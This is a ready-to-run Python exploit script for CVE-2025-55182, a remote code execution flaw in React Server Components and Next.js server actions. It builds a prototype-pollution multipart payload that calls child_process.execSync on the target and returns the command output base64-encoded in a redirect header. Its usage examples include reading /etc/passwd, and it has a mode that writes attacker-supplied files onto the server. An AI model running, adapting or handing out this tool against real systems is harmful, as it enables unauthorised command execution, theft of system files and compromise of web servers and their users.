#!/usr/bin/env python3

import argparse
import sys
import hashlib
import time
import re
import base64
from urllib.parse import unquote
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Theme:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'

class ExploitConfig:
    def __init__(self):
        self.target_url = "http://hacx.me"
        self.payload_cmd = "id"
        self.version = "1.0"
        self.author = "hacx.me"
        self.timeout = 15
        
    def normalize_url(self, url):
        if not re.match(r'^https?://', url):
            return f"https://{url}"
        return url

class BannerDisplay:
    """Handles all banner and UI displays"""
    
    @staticmethod
    def show_header():
        """Display main exploitation framework header"""
        banner = f"""
{Theme.FAIL}{Theme.BOLD}
{Theme.ENDC}
{Theme.OKCYAN}    [CVE-2025-55182 React Server Components RCE]{Theme.ENDC}
"""
        print(banner)
    
    @staticmethod
    def show_config(target, command):
        print(f"\n{Theme.OKBLUE}[*] EXPLOITATION PARAMETERS{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        print(f"{Theme.OKCYAN}  TARGET    :{Theme.ENDC} {target}")
        print(f"{Theme.OKCYAN}  PAYLOAD   :{Theme.ENDC} {command}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")
    
    @staticmethod
    def show_success(output):
        print(f"\n{Theme.OKGREEN}{Theme.BOLD}[+] EXPLOITATION SUCCESSFUL{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        
        # Process output
        cleaned_output = output.replace(' | ', '\n')
        lines = cleaned_output.split('\n')
        
        for line in lines:
            if line.strip():
                print(f"{Theme.OKGREEN}  ▸{Theme.ENDC} {line}")
        
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")
    
    @staticmethod
    def show_failure(error_type, details=""):
        print(f"\n{Theme.FAIL}{Theme.BOLD}[X] EXPLOITATION FAILED{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        
        error_map = {
            'forbidden': ('ACCESS DENIED', 'WAF/Firewall blocking detected'),
            'timeout': ('CONNECTION TIMEOUT', 'Target did not respond'),
            'ssl': ('SSL ERROR', 'Certificate validation failed - try HTTP'),
            'server_error': ('SERVER ERROR', 'Target rejected payload or not vulnerable'),
            'unknown': ('EXPLOITATION FAILED', 'Target may not be vulnerable')
        }
        
        title, msg = error_map.get(error_type, error_map['unknown'])
        print(f"{Theme.FAIL}  ▸ {title}{Theme.ENDC}")
        print(f"{Theme.WARNING}  ▸ {msg}{Theme.ENDC}")
        if details:
            print(f"{Theme.DIM}  ▸ {details}{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")

class PayloadGenerator:    
    @staticmethod
    def generate_hash(length=8):
        timestamp = str(time.time()).encode()
        return hashlib.sha256(timestamp).hexdigest()[:length]
    
    @staticmethod
    def sanitize_command(cmd):
        return cmd.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '')
    
    @staticmethod
    def build_exploit_payload(command):
        safe_cmd = PayloadGenerator.sanitize_command(command)
        injection = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
            f'"var res=process.mainModule.require(\'child_process\').execSync(\'{safe_cmd}\')'
            '.toString();var b64=Buffer.from(res).toString(\'base64\');;throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
            '{digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`});","_chunks":"$Q2",'
            '"_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        # Multipart boundary
        boundary = "----HacxMeBoundaryX9K2pLvN4MqR8TdF"
        
        # Multipart body
        body_parts = [
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="0"\r\n\r\n',
            f'{injection}\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="1"\r\n\r\n',
            '"$@0"\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="2"\r\n\r\n',
            '[]\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF--\r\n"
        ]
        
        return ''.join(body_parts), boundary

class ExploitEngine:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        
    def craft_headers(self, boundary):
        return {
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': PayloadGenerator.generate_hash(8),
            'X-Nextjs-Html-Request-Id': PayloadGenerator.generate_hash(20),
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        }
    
    def execute(self):
        print(f"{Theme.OKCYAN}[*] Initiating exploitation sequence...{Theme.ENDC}")
        payload_body, boundary = PayloadGenerator.build_exploit_payload(self.config.payload_cmd)
        headers = self.craft_headers(boundary)
        print(f"{Theme.OKCYAN}[*] Establishing connection to target...{Theme.ENDC}")
        
        try:
            # Launch exploitation
            response = self.session.post(
                self.config.target_url,
                data=payload_body,
                headers=headers,
                timeout=self.config.timeout,
                allow_redirects=False,
                verify=False
            )
            
            # Results
            return self.parse_response(response)
            
        except requests.exceptions.Timeout:
            return False, 'timeout', f'Connection timeout after {self.config.timeout} seconds'
        except requests.exceptions.SSLError as e:
            return False, 'ssl', str(e)
        except requests.exceptions.RequestException as e:
            return False, 'unknown', str(e)
    
    def parse_response(self, response):
        redirect_header = response.headers.get('X-Action-Redirect', '')
        match = re.search(r'/login\?a=([^;]*)', redirect_header)
        
        if match:
            encoded_output = match.group(1)
            url_decoded = unquote(encoded_output)
            try:
                # Decode base64 output
                decoded_output = base64.b64decode(url_decoded).decode('utf-8', errors='replace')
            except:
                # Fallback if not base64
                decoded_output = url_decoded
            return True, 'success', decoded_output
        
        if response.status_code == 403:
            return False, 'forbidden', 'HTTP 403 Forbidden'
        elif response.status_code == 500:
            return False, 'server_error', 'HTTP 500 Internal Server Error'
        else:
            return False, 'unknown', f'HTTP {response.status_code}'

def setup_arguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t hacx.me -c "whoami"
  %(prog)s -t http://hacx.me -c "cat /etc/passwd"
  %(prog)s -t hacx.me -c "ls -la /var/www"
  %(prog)s -t hacx.me -f payload.b64
        """
    )
    
    parser.add_argument('-t', '--target', 
                       metavar='URL',
                       help='Target URL or domain (default: http://hacx.me)')
    parser.add_argument('-c', '--command',
                       metavar='CMD', 
                       help='Command to execute on target (default: id)')
    parser.add_argument('-f', '--upload-file',
                       metavar='FILE',
                       help='Upload base64-encoded file to target (saves as out.b64)')
    parser.add_argument('-T', '--timeout',
                       type=int,
                       default=15,
                       metavar='SECONDS',
                       help='Request timeout in seconds (default: 15)')
    
    return parser

def main():
    BannerDisplay.show_header()
    parser = setup_arguments()
    args = parser.parse_args()
    config = ExploitConfig()
    
    if args.target:
        config.target_url = config.normalize_url(args.target)
    
    # Set timeout
    config.timeout = args.timeout
    
    # Handle file upload mode
    if args.upload_file:
        try:
            with open(args.upload_file, 'r') as f:
                b64_content = f.read().strip()
            
            # Create command to write base64 content to file on target
            config.payload_cmd = f'echo {b64_content} > out.b64'
            print(f"{Theme.OKCYAN}[*] Upload mode: {args.upload_file} -> out.b64{Theme.ENDC}")
            print(f"{Theme.OKCYAN}[*] Base64 content size: {len(b64_content)} bytes{Theme.ENDC}")
        except FileNotFoundError:
            print(f"{Theme.FAIL}[!] Error: File '{args.upload_file}' not found{Theme.ENDC}")
            sys.exit(1)
        except Exception as e:
            print(f"{Theme.FAIL}[!] Error reading file: {e}{Theme.ENDC}")
            sys.exit(1)
    elif args.command:
        config.payload_cmd = args.command
            
    BannerDisplay.show_config(config.target_url, config.payload_cmd)    
    engine = ExploitEngine(config)
    success, status, data = engine.execute()
    
    # Output Results
    if success:
        BannerDisplay.show_success(data)
        sys.exit(0)
    else:
        BannerDisplay.show_failure(status, data)
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Theme.WARNING}[!] Exploitation interrupted by user{Theme.ENDC}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Theme.FAIL}[!] Fatal error: {e}{Theme.ENDC}\n")
        sys.exit(1)
